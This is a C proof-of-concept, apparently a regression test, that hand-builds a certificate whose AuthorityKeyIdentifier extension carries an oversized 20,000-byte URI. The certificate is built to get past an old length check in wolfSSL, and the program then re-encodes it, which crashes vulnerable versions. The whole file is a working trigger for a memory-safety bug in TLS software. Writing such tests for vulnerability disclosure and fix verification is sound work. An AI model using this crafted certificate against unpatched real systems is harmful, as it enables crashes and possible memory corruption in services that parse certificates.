#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/openssl/x509.h>
#include <wolfssl/openssl/bio.h>

#define DER_CAP 32768

static int write_file(const char* path, const unsigned char* buf, size_t len)
{
    FILE* f = fopen(path, "wb");
    if (f == NULL) {
        perror("fopen");
        return -1;
    }

    if (fwrite(buf, 1, len, f) != len) {
        perror("fwrite");
        fclose(f);
        return -1;
    }

    fclose(f);
    return 0;
}

static int tlv_hdr(unsigned char tag, size_t n, unsigned char* out, size_t* hlen)
{
    size_t i = 0;

    out[i++] = tag;

    if (n < 0x80u) {
        out[i++] = (unsigned char)n;
    }
    else if (n < 0x100u) {
        out[i++] = 0x81;
        out[i++] = (unsigned char)n;
    }
    else if (n < 0x10000u) {
        out[i++] = 0x82;
        out[i++] = (unsigned char)(n >> 8);
        out[i++] = (unsigned char)n;
    }
    else {
        fprintf(stderr, "length too large for this minimal DER builder: %zu\n", n);
        return -1;
    }

    *hlen = i;
    return 0;
}

static int build_crafted_akid_cert(unsigned char* buf, size_t cap, size_t* out_len)
{
    size_t pos = 0;
    size_t akid_val_len = 0;
    unsigned char* akid_val = NULL;

#define CHECK_CAP(n) do { \
    if (pos + (n) > cap) { \
        fprintf(stderr, "DER buffer overflow in builder: need=%zu pos=%zu cap=%zu\n", \
                (size_t)(n), pos, cap); \
        goto fail; \
    } \
} while (0)

#define PUT1(b) do { \
    CHECK_CAP(1); \
    buf[pos++] = (unsigned char)(b); \
} while (0)

#define PUTN(p, n) do { \
    CHECK_CAP((n)); \
    memcpy(buf + pos, (p), (n)); \
    pos += (n); \
} while (0)

#define WRAP(start, tag) do { \
    size_t _len = pos - (start); \
    unsigned char _hdr[6]; \
    size_t _hlen = 0; \
    if (tlv_hdr((unsigned char)(tag), _len, _hdr, &_hlen) != 0) goto fail; \
    CHECK_CAP(_hlen); \
    memmove(buf + (start) + _hlen, buf + (start), _len); \
    memcpy(buf + (start), _hdr, _hlen); \
    pos += _hlen; \
} while (0)

    /*
     * Build AuthorityKeyIdentifier extension value.
     *
     * [0] keyIdentifier is only 20 bytes, so the old guard checking authKeyIdSz
     * passes. [1] authorityCertIssuer contains a URI of ~20000 bytes, so the full
     * extension size authKeyIdSrcSz becomes much larger than cert->akid.
     */
    {
        size_t akid_start = pos;
        size_t s;
        int i;

        s = pos;
        for (i = 0; i < 20; i++) {
            PUT1(0x41);
        }
        WRAP(s, 0x80); /* [0] keyIdentifier */

        s = pos;
        {
            const char* pfx = "http://e/";
            PUTN((const unsigned char*)pfx, strlen(pfx));
            for (i = 0; i < 20000; i++) {
                PUT1('Z');
            }
        }
        WRAP(s, 0x86); /* GeneralName [6] URI */
        WRAP(s, 0xA1); /* [1] authorityCertIssuer */

        s = pos;
        PUT1(0x01);
        WRAP(s, 0x82); /* [2] authorityCertSerialNumber */

        WRAP(akid_start, 0x30); /* SEQUENCE */

        akid_val_len = pos - akid_start;
        akid_val = (unsigned char*)malloc(akid_val_len);
        if (akid_val == NULL) {
            perror("malloc");
            goto fail;
        }

        memcpy(akid_val, buf + akid_start, akid_val_len);
    }

    /*
     * Build minimal self-signed v3 certificate.
     */
    pos = 0;
    {
        size_t tbs_start = pos;
        size_t s;

        /* version [0] EXPLICIT INTEGER 2, meaning v3 */
        PUT1(0xA0); PUT1(0x03); PUT1(0x02); PUT1(0x01); PUT1(0x02);

        /* serialNumber INTEGER 1 */
        PUT1(0x02); PUT1(0x01); PUT1(0x01);

        /* signature: ecdsa-with-SHA256 */
        s = pos;
        {
            unsigned char oid[] = {
                0x06,0x08,0x2A,0x86,0x48,0xCE,0x3D,0x04,0x03,0x02
            };
            PUTN(oid, sizeof(oid));
        }
        WRAP(s, 0x30);

        /* issuer: CN=A */
        s = pos;
        {
            size_t rdn = pos;
            size_t atv = pos;
            unsigned char cn[] = {0x06,0x03,0x55,0x04,0x03};
            PUTN(cn, sizeof(cn));
            PUT1(0x0C); PUT1(0x01); PUT1('A');
            WRAP(atv, 0x30);
            WRAP(rdn, 0x31);
            WRAP(s, 0x30);
        }

        /* validity */
        s = pos;
        {
            unsigned char t1[] = {
                0x17,0x0D,'2','5','0','1','0','1','0','0','0','0','0','0','Z'
            };
            unsigned char t2[] = {
                0x17,0x0D,'3','5','0','1','0','1','0','0','0','0','0','0','Z'
            };
            PUTN(t1, sizeof(t1));
            PUTN(t2, sizeof(t2));
        }
        WRAP(s, 0x30);

        /* subject: CN=A */
        s = pos;
        {
            size_t rdn = pos;
            size_t atv = pos;
            unsigned char cn[] = {0x06,0x03,0x55,0x04,0x03};
            PUTN(cn, sizeof(cn));
            PUT1(0x0C); PUT1(0x01); PUT1('A');
            WRAP(atv, 0x30);
            WRAP(rdn, 0x31);
            WRAP(s, 0x30);
        }

        /* subjectPublicKeyInfo: EC P-256 with valid generator point */
        s = pos;
        {
            size_t alg = pos;
            size_t bs;
            unsigned char ecpk[] = {
                0x06,0x07,0x2A,0x86,0x48,0xCE,0x3D,0x02,0x01
            };
            unsigned char p256[] = {
                0x06,0x08,0x2A,0x86,0x48,0xCE,0x3D,0x03,0x01,0x07
            };
            static const unsigned char p256G[64] = {
                0x6B,0x17,0xD1,0xF2,0xE1,0x2C,0x42,0x47,
                0xF8,0xBC,0xE6,0xE5,0x63,0xA4,0x40,0xF2,
                0x77,0x03,0x7D,0x81,0x2D,0xEB,0x33,0xA0,
                0xF4,0xA1,0x39,0x45,0xD8,0x98,0xC2,0x96,
                0x4F,0xE3,0x42,0xE2,0xFE,0x1A,0x7F,0x9B,
                0x8E,0xE7,0xEB,0x4A,0x7C,0x0F,0x9E,0x16,
                0x2B,0xCE,0x33,0x57,0x6B,0x31,0x5E,0xCE,
                0xCB,0xB6,0x40,0x68,0x37,0xBF,0x51,0xF5
            };

            PUTN(ecpk, sizeof(ecpk));
            PUTN(p256, sizeof(p256));
            WRAP(alg, 0x30);

            bs = pos;
            PUT1(0x00);
            PUT1(0x04);
            PUTN(p256G, sizeof(p256G));
            WRAP(bs, 0x03);
        }
        WRAP(s, 0x30);

        /* extensions [3] with AuthorityKeyIdentifier */
        {
            size_t exts_outer = pos;
            size_t exts_seq = pos;
            size_t ext = pos;
            size_t ev;
            unsigned char akid_oid[] = {0x06,0x03,0x55,0x1D,0x23};

            PUTN(akid_oid, sizeof(akid_oid));

            ev = pos;
            PUTN(akid_val, akid_val_len);
            WRAP(ev, 0x04);

            WRAP(ext, 0x30);
            WRAP(exts_seq, 0x30);
            WRAP(exts_outer, 0xA3);
        }

        WRAP(tbs_start, 0x30);

        /* signatureAlgorithm */
        s = pos;
        {
            unsigned char oid[] = {
                0x06,0x08,0x2A,0x86,0x48,0xCE,0x3D,0x04,0x03,0x02
            };
            PUTN(oid, sizeof(oid));
        }
        WRAP(s, 0x30);

        /* signatureValue: dummy ECDSA signature */
        s = pos;
        {
            size_t sig;
            PUT1(0x00);
            sig = pos;
            PUT1(0x02); PUT1(0x01); PUT1(0x01);
            PUT1(0x02); PUT1(0x01); PUT1(0x01);
            WRAP(sig, 0x30);
        }
        WRAP(s, 0x03);

        WRAP(0, 0x30); /* outer Certificate SEQUENCE */
    }

    *out_len = pos;
    free(akid_val);

#undef CHECK_CAP
#undef PUT1
#undef PUTN
#undef WRAP

    return 0;

fail:
    free(akid_val);
    return -1;
}

int main(int argc, char** argv)
{
    unsigned char* der = NULL;
    size_t der_len = 0;
    WOLFSSL_X509* x = NULL;
    WOLFSSL_BIO* bio = NULL;
    int ret = 1;

    const char* dump_path = NULL;

    if (argc >= 2) {
        dump_path = argv[1];
    }

    der = (unsigned char*)malloc(DER_CAP);
    if (der == NULL) {
        perror("malloc");
        return 2;
    }

    if (build_crafted_akid_cert(der, DER_CAP, &der_len) != 0) {
        fprintf(stderr, "failed to build crafted AKID certificate\n");
        free(der);
        return 3;
    }

    fprintf(stderr, "[*] crafted DER length: %zu\n", der_len);

    if (dump_path != NULL) {
        if (write_file(dump_path, der, der_len) != 0) {
            free(der);
            return 4;
        }
        fprintf(stderr, "[*] wrote DER to: %s\n", dump_path);
    }

    wolfSSL_Init();

    x = wolfSSL_X509_d2i(NULL, der, (int)der_len);
    if (x == NULL) {
        fprintf(stderr, "wolfSSL_X509_d2i failed\n");
        wolfSSL_Cleanup();
        free(der);
        return 5;
    }

    fprintf(stderr, "[*] wolfSSL_X509_d2i succeeded\n");

    bio = wolfSSL_BIO_new(wolfSSL_BIO_s_mem());
    if (bio == NULL) {
        fprintf(stderr, "wolfSSL_BIO_new failed\n");
        wolfSSL_X509_free(x);
        wolfSSL_Cleanup();
        free(der);
        return 6;
    }

    fprintf(stderr, "[*] calling wolfSSL_i2d_X509_bio\n");

    ret = wolfSSL_i2d_X509_bio(bio, x);

    fprintf(stderr, "[*] wolfSSL_i2d_X509_bio returned %d\n", ret);

    wolfSSL_BIO_free(bio);
    wolfSSL_X509_free(x);
    wolfSSL_Cleanup();
    free(der);

    /*
     * Fixed version is expected to fail gracefully and return 0/1 depending on
     * API semantics. Vulnerable version is expected to crash before returning.
     */
    return ret == 1 ? 0 : 1;
}
